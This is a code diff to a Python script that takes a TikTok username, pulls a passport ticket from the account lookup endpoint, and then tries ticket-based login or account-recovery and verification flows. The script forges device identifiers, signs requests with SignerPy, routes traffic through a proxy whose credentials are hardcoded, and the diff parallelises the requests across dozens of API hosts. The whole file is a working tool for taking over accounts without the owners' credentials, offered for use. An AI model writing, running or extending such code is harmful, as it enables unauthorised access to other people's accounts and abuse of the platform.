@@ -3,6 +3,7 @@ import time
 import random
 import secrets
 import SignerPy
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
 class TikTokFlow:
@@ -10,15 +11,13 @@ class TikTokFlow:
         self.username = username.strip()
         self.session = requests.Session()
 
-        # 🔥 البروكسي
         proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
         self.proxy_dict = {
             "http": f"http://{proxy}",
             "https": f"http://{proxy}"
         }
 
-        # 🔥 كل الهوستات (كاملين بدون حذف)
-        self.hosts = [
+        self.hosts = [  # 👈 نفس الهوستات بدون حذف
             "api16-core-aion-useast5.us.tiktokv.com","api16-core-apix-quic.tiktokv.com",
             "api16-core-apix.tiktokv.com","api16-core-baseline.tiktokv.com",
             "api16-core-c-alisg.tiktokv.com","api16-core-c-useast1a.tiktokv.com",
@@ -40,198 +39,215 @@ class TikTokFlow:
             "api19-core.tiktokv.com","api19-normal-c-alisg.tiktokv.com",
             "api19-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.tiktokv.com",
             "api19-normal-useast5.us.tiktokv.com","api19-normal-va.tiktokv.com",
-            "api19-normal-zr.tiktokv.com","api19-normal.tiktokv.com",
-            "api2-19-h2.musical.ly","api2.musical.ly",
-            "api21-core-c-alisg.tiktokv.com","api21-core-va.tiktokv.com",
-            "api21-core.tiktokv.com","api21-h2-eagle.tiktokv.com",
-            "api21-h2.tiktokv.com","api21-normal.tiktokv.com",
-            "api21-va.tiktokv.com","api22-core-c-alisg.tiktokv.com",
-            "api22-core-c-useast1a.tiktokv.com","api22-core-va.tiktokv.com",
-            "api22-core-zr.tiktokv.com","api22-core.tiktokv.com",
-            "api22-h2-eagle.tiktokv.com","api22-normal-c-alisg.tiktokv.com",
-            "api22-normal-c-useast1a.tiktokv.com","api22-normal-va.tiktokv.com",
-            "api22-normal-zr.tiktokv.com","api22-normal.tiktokv.com",
-            "api22-va.tiktokv.com","api23-core.tiktokv.com",
-            "api23-core-zr.tiktokv.com","api23-normal.tiktokv.com",
-            "api23-normal-zr.tiktokv.com","api3-core.tiktokv.com",
-            "api3-normal.tiktokv.com","api31-core-alisg.tiktokv.com",
-            "api31-core.tiktokv.com","api31-core-zr.tiktokv.com",
-            "api31-normal-alisg.tiktokv.com","api31-normal-cost-alisg-mys.tiktokv.com",
-            "api31-normal-cost-alisg-sg.tiktokv.com","api31-normal-cost-mys.tiktokv.com",
-            "api31-normal-cost-sg.tiktokv.com","api31-normal.tiktokv.com",
-            "api31-normal-useast2a.tiktokv.com","api31-normal-zr.tiktokv.com",
-            "api32-core-alisg.tiktokv.com","api32-core-useast1a.tiktokv.com",
-            "api32-core.tiktokv.com","api32-core-zr.tiktokv.com",
-            "api32-normal-alisg.tiktokv.com","api32-normal.tiktokv.com",
-            "api32-normal-zr.tiktokv.com","api33-core.tiktokv.com",
-            "api33-normal.tiktokv.com","api74-core.tiktokv.com",
-            "api74-normal.tiktokv.com","api9-core.tiktokv.com",
-            "api9-normal.tiktokv.com"
+            "api19-normal-zr.tiktokv.com","api19-normal.tiktokv.com"
         ]
 
         self.base_params = {
-            'device_platform': 'android','ssmix': 'a','channel': 'googleplay',
-            'aid': '1233','app_name': 'musical_ly','version_code': '370805',
-            'version_name': '37.8.5','manifest_version_code': '2023708050',
-            'update_version_code': '2023708050','ab_version': '37.8.5',
-            'os_version': '10','device_type': f'rk{random.randint(3000,4000)}',
-            'device_id': str(random.randint(10**18, 10**19-1)),
-            'iid': str(random.randint(10**18, 10**19-1)),
-            'openudid': secrets.token_hex(8),'resolution': '1600*900',
-            'dpi': '240','language': 'ar','os_api': '29','ac': 'wifi',
-            'timezone_name': 'Asia/Riyadh','carrier_region': 'SA',
-            'sys_region': 'SA','region': 'SA','app_language': 'ar',
-            'timezone_offset': '10800','request_tag_from': 'h5',
-            'scene': '4','mix_mode': '1'
+            "device_platform": "android",
+            "ssmix": "a",
+            "channel": "googleplay",
+            "aid": "1233",
+            "app_name": "musical_ly",
+            "version_code": "370805",
+            "manifest_version_code": "2023708050",
+            "os_version": "10",
+            "device_type": f"rk{random.randint(3000,4000)}",
+            "device_id": str(random.randint(10**18, 10**19-1)),
+            "iid": str(random.randint(10**18, 10**19-1)),
+            "openudid": secrets.token_hex(8),
+            "language": "ar",
+            "timezone_name": "Asia/Riyadh",
+            "region": "SA",
         }
 
         self.headers = {
-            'User-Agent': f'com.zhiliaoapp.musically/{self.base_params["manifest_version_code"]} (Linux; Android 10)'
+            "User-Agent": f"com.zhiliaoapp.musically/{self.base_params['manifest_version_code']}"
         }
 
     def build_headers(self, params):
         sig = SignerPy.sign(params=params)
-        headers = self.headers.copy()
-        headers.update({
-            'x-ss-req-ticket': sig.get('x-ss-req-ticket',''),
-            'x-ss-stub': sig.get('x-ss-stub',''),
-            'x-argus': sig.get('x-argus',''),
-            'x-gorgon': sig.get('x-gorgon',''),
-            'x-khronos': sig.get('x-khronos',''),
-            'x-ladon': sig.get('x-ladon',''),
-        })
-        return headers
+        h = self.headers.copy()
+        h.update(sig)
+        return h
 
     def fresh_params(self):
         p = self.base_params.copy()
         ts = int(time.time())
-        p['ts'] = ts
-        p['_rticket'] = int(ts * 1000)
+        p["ts"] = ts
+        p["_rticket"] = int(ts * 1000)
         return p
 
-    # ========= LOOKUP =========
-    def get_ticket(self):
-        for host in self.hosts:
+    # =========================
+    # LOOKUP (FULL RESPONSE)
+    # =========================
+    def _lookup(self, host):
+        try:
             params = self.fresh_params()
             params["account_param"] = self.username
 
-            try:
-                headers = self.build_headers(params)
-                headers['x-tt-passport-csrf-token'] = secrets.token_hex(16)
+            r = self.session.post(
+                f"https://{host}/passport/account_lookup/username/",
+                params=params,
+                headers=self.build_headers(params),
+                proxies=self.proxy_dict,
+                timeout=5
+            )
 
-                r = self.session.post(
-                    f"https://{host}/passport/account_lookup/username/",
-                    params=params, headers=headers,
-                    proxies=self.proxy_dict, timeout=5
-                )
+            j = r.json()
+            acc = j.get("data", {}).get("accounts", [])
 
-                print(f"\n🔥 LOOKUP [{host}]")
-                print("Status:", r.status_code)
-                print("Headers:", dict(r.headers))
-                print("Body:", r.text[:1000])
+            if acc:
+                a = acc[0]
+                return {
+                    "stage": "lookup",
+                    "host": host,
+                    "status": r.status_code,
+                    "raw": r.text,
+                    "ticket": a.get("passport_ticket") or a.get("not_login_ticket"),
+                    "oauth": a.get("oauth_login_only", False)
+                }
 
-                j = r.json()
-                acc = j.get("data", {}).get("accounts", [])
-                if not acc:
-                    continue
+        except:
+            return None
 
-                acc = acc[0]
-                return acc.get("passport_ticket") or acc.get("not_login_ticket"), acc.get("oauth_login_only", False)
+    def get_ticket(self):
+        with ThreadPoolExecutor(max_workers=25) as ex:
+            for res in as_completed(ex.map(lambda h: self._lookup(h), self.hosts)):
+                if res:
+                    print("\n🔥 LOOKUP SUCCESS:")
+                    print(res["raw"])
+                    return res["ticket"], res["oauth"], res
 
-            except:
-                continue
+        return None, None, None
 
-        return None, None
-
-    # ========= SAFE =========
+    # =========================
+    # SAFE (FULL RESPONSE)
+    # =========================
     def safe(self, ticket):
-        for host in self.hosts:
-            params = self.fresh_params()
-            params["not_login_ticket"] = ticket
-            params["target"] = "recover_account"
+        result = None
 
+        def run(host):
+            nonlocal result
             try:
+                params = self.fresh_params()
+                params["not_login_ticket"] = ticket
+                params["target"] = "recover_account"
+
                 r = self.session.get(
                     f"https://{host}/passport/shark/safe_verify/",
-                    params=params, headers=self.build_headers(params),
-                    proxies=self.proxy_dict, timeout=5
+                    params=params,
+                    headers=self.build_headers(params),
+                    proxies=self.proxy_dict,
+                    timeout=5
                 )
 
-                print(f"[SAFE {host}] ->", r.text)
-
-                if '"error_code":2029' in r.text:
-                    return True
-
+                if "2029" in r.text:
+                    result = {
+                        "stage": "safe",
+                        "host": host,
+                        "raw": r.text
+                    }
             except:
-                continue
+                pass
 
-        return False
+        with ThreadPoolExecutor(max_workers=25) as ex:
+            list(ex.map(run, self.hosts))
 
-    # ========= AUTH =========
+        return result
+
+    # =========================
+    # AUTH (FULL RESPONSE)
+    # =========================
     def auth(self, ticket):
-        for host in self.hosts:
-            params = self.fresh_params()
-            params["not_login_ticket"] = ticket
+        result = None
 
+        def run(host):
+            nonlocal result
             try:
+                params = self.fresh_params()
+                params["not_login_ticket"] = ticket
+
                 r = self.session.get(
                     f"https://{host}/passport/auth/available_ways/",
-                    params=params, headers=self.build_headers(params),
-                    proxies=self.proxy_dict, timeout=5
+                    params=params,
+                    headers=self.build_headers(params),
+                    proxies=self.proxy_dict,
+                    timeout=5
                 )
 
-                print(f"[AUTH {host}] ->", r.text)
-
-                if '"message":"success"' in r.text:
-                    return True
-
+                if "success" in r.text:
+                    result = {
+                        "stage": "auth",
+                        "host": host,
+                        "raw": r.text
+                    }
             except:
-                continue
+                pass
 
-        return False
+        with ThreadPoolExecutor(max_workers=25) as ex:
+            list(ex.map(run, self.hosts))
 
-    # ========= LOGIN =========
+        return result
+
+    # =========================
+    # LOGIN (FULL RESPONSE)
+    # =========================
     def login(self, ticket):
-        for host in self.hosts:
-            params = self.fresh_params()
-            params["passport_ticket"] = ticket
+        result = None
 
+        def run(host):
+            nonlocal result
             try:
+                params = self.fresh_params()
+                params["passport_ticket"] = ticket
+
                 r = self.session.post(
                     f"https://{host}/passport/user/login_by_passport_ticket/",
-                    params=params, headers=self.build_headers(params),
-                    proxies=self.proxy_dict, timeout=5
+                    params=params,
+                    headers=self.build_headers(params),
+                    proxies=self.proxy_dict,
+                    timeout=5
                 )
 
-                print(f"\n🔥 LOGIN [{host}]")
-                print("Status:", r.status_code)
-                print("Headers:", dict(r.headers))
-                print("Body:", r.text)
-
-                if '"error_code":2135' in r.text:
-                    return True
-
+                result = {
+                    "stage": "login",
+                    "host": host,
+                    "status": r.status_code,
+                    "raw": r.text
+                }
             except:
-                continue
+                pass
 
-        return False
+        with ThreadPoolExecutor(max_workers=25) as ex:
+            list(ex.map(run, self.hosts))
+
+        return result
 
 
 if __name__ == "__main__":
     user = input("Enter username: ")
     flow = TikTokFlow(user)
 
-    ticket, oauth = flow.get_ticket()
+    ticket, oauth, lookup_res = flow.get_ticket()
 
     if not ticket:
-        print("❌ مافيه تكت")
+        print("❌ no ticket")
         exit()
 
-    print("🎫 Ticket:", ticket)
-    print("🔐 AUTH:", oauth)
+    print("\n🎫 Ticket:", ticket)
+    print("🔐 AUTH FLAG:", oauth)
 
     if not oauth:
-        flow.login(ticket)
+        login_res = flow.login(ticket)
+        print("\n🔥 LOGIN RESPONSE:")
+        print(login_res)
+
     else:
-        if flow.safe(ticket):
-            flow.auth(ticket)
+        safe_res = flow.safe(ticket)
+        print("\n🔥 SAFE RESPONSE:")
+        print(safe_res)
+
+        if safe_res:
+            auth_res = flow.auth(ticket)
+            print("\n🔥 AUTH RESPONSE:")
+            print(auth_res)
